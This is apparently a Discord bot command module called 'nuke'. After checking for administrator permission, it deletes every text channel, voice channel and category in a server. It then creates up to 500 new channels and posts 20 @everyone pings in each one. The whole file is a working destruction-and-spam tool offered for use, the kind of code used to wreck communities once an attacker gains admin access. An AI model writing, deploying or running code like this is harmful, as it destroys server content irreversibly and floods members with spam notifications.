let nuking = false;
let nukeTimeout;

module.exports = {
  name: 'nuke',
  async execute(message, args, config, client) {
    if (!message.member.permissions.has('ADMINISTRATOR')) {
      return message.channel.send(':warning: You do not have permission to use this command.');
    }

    if (nuking) {
      return message.channel.send('❕ Nuke process is already running.');
    }

    nuking = true;

    // Fetch guild and channels
    const guild = message.guild;
    await guild.channels.fetch();

    // Delete all channels and categories
    const channelsToDelete = guild.channels.cache.filter(c => c.type === 'GUILD_TEXT' || c.type === 'GUILD_VOICE');
    const categoriesToDelete = guild.channels.cache.filter(c => c.type === 'GUILD_CATEGORY');

    async function deleteChannelsAndCategories() {
      // Delete all channels
      for (const channel of channelsToDelete.values()) {
        try {
          await channel.delete();
          console.log(`Deleted channel ${channel.id}`);
        } catch (error) {
          console.error(`Failed to delete channel ${channel.id}:`, error);
        }
      }

      // Delete all categories
      for (const category of categoriesToDelete.values()) {
        try {
          await category.delete();
          console.log(`Deleted category ${category.id}`);
        } catch (error) {
          console.error(`Failed to delete category ${category.id}:`, error);
        }
      }
    }

    await deleteChannelsAndCategories();

    // Now start the nuke process
    const maxChannels = 500;
    let createdChannels = 0;

    // Create channels and send @everyone pings
    async function startNuking() {
      const interval = setInterval(async () => {
        if (createdChannels >= maxChannels) {
          clearInterval(interval);
          nuking = false;
          return message.channel.send('✔ Nuke process completed.');
        }

        // Create a new text channel and send @everyone pings
        try {
          const channel = await guild.channels.create(`nuke-channel-${createdChannels + 1}`, {
            type: 'GUILD_TEXT'
          });

          for (let i = 0; i < 20; i++) {
            await channel.send('@everyone');
          }

          createdChannels++;
          console.log(`Created and pinged channel ${channel.id}`);
        } catch (error) {
          console.error('Failed to create or ping channel:', error);
        }
      }, 1000); // Adjust the interval if needed
    }

    startNuking();

    // Optional: Stop the nuking process after a certain period
    nukeTimeout = setTimeout(() => {
      nuking = false;
      message.channel.send('❗ Nuke process timed out.');
    }, 5 * 60 * 1000); // 5 minutes timeout
  }
};
